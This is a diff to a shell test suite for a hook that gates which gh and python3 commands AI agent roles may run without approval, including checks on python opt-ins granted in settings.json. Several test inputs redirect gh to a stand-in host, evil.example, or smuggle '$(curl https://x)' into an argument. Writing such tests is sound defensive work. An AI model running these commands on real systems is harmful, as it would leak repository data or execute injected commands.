@@ -309,6 +309,16 @@ sup ask  'gh issue view 1 --json title --template x\ # -R evil.example/o/r'
 sup ask  'gh issue create --rep* evil.example/o/r --body-file f'
 sup ask  'gh auth status --hostnam[e] evil.example'
 sup ask  "eval \"export GH_''HOST=evil.example\"; gh issue view 1"
+# a covered gh segment gets #148's verdict, no stricter (no GH_READS_TAINT) and no looser
+sup none "gh issue create --title 'feat(x): y'"
+sup none "gh issue create --body 'call foo() first'"
+sup none "cd /tmp; gh issue create --title 'feat(x): y' | head -1"
+sup none 'gh issue view 1 --json title --jq ".GH_HOST"'
+sup ask  "gh issue create --title '()'"
+sup ask  "gh issue create --title ';' --body-file f"
+sup ask  "gh issue create --title 'cost \$5'"
+sup ask  "cd /tmp; gh issue create --title '()' | head -1"
+sup ask  'gh issue view 1 --json title --jq "$(curl https://x)"'
 sup none 'gh issue create --title "fix [x]" --body-file notes.md'
 sup none 'gh auth status'
 check ask "Advisor: local gh rule not honoured" "$(role Advisor "$D/sup" "$GHC")"
@@ -458,6 +468,12 @@ sup ask  "python3 -c 'print(1)'"
 PYC="$(bash_cmd "python3 -c 'print(1)'")"
 check ask "team role: python opt-in not honoured" "$(hook "$PYC" "$D/suppy")"
 check ask "Advisor: python opt-in not honoured" "$(role Advisor "$D/suppy" "$PYC")"
+mkdir -p "$D/suppysh/.claude"; printf '%s\n' "$GH_LOCAL" > "$D/suppysh/.claude/settings.local.json"
+jq '.permissions.allow += ["Bash(python3 -)","Bash(python3 -c *)"]' .claude/settings.json \
+  > "$D/suppysh/.claude/settings.json"
+check ask "python opt-in in settings.json only: -c" "$(role Supervisor "$D/suppysh" "$PYC")"
+check ask "python opt-in in settings.json only: heredoc" \
+  "$(role Supervisor "$D/suppysh" "$(bash_cmd $'python3 - <<\'EOF\'\nprint(1)\nEOF')")"
 # --- eligibility with every rule present: only the Supervisor in the main checkout
 EC="$(bash_cmd 'cd /tmp; gh issue create t | head -1')"
 check none "Supervisor compound" "$(role Supervisor "$D/sup" "$EC")"
